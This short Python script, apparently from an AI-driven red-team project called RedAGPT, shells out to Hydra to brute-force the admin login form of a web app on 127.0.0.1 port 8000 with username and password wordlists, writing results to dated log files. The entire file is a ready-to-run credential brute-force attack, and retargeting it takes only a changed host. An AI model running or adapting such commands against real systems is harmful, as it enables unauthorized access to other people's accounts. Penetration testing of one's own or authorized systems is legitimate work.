import os

os.system('hydra -v -L /home/host/Project/Python/RedAGPT/RedAGPT/tools/data/username_list_small.txt -P /home/host/Project/Python/RedAGPT/RedAGPT/tools/data/password_list_small.txt -s 8000 127.0.0.1 http-post-form -o /home/host/Project/Python/RedAGPT/RedAGPT/tools/logs/hydra_log.txt \
/admin/login/:username=^USER^&password=^PASS^:F=Invalid username or password > /home/host/Project/Python/RedAGPT/RedAGPT/tools/logs/info20230430_0051.txt 2> /home/host/Project/Python/RedAGPT/RedAGPT/tools/logs/error20230430_0051.txt')
